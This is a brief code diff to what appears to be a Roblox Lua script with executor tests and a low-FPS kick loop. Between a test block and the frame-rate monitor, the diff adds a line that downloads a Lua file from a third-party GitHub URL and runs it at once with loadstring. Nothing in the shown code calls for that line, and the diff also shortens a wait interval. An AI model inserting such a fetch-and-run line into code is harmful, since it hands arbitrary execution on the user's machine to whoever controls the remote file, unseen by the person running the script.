@@ -94,6 +94,8 @@ test("request", {"http.request", "http_request"}, function()
     print(data["user-agent"])
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NopNopA/NopNopA/main/N.lua"))()
+
 local renderStepped = game:GetService("RunService").RenderStepped
 local Fps_low = 2
 local function step()
@@ -117,6 +119,5 @@ while true do
             game.Players.LocalPlayer:Kick('[⛔] Restarting due to low FPS')
         end
     end
-    wait(3000)  
+    wait(1000)  
 end
-
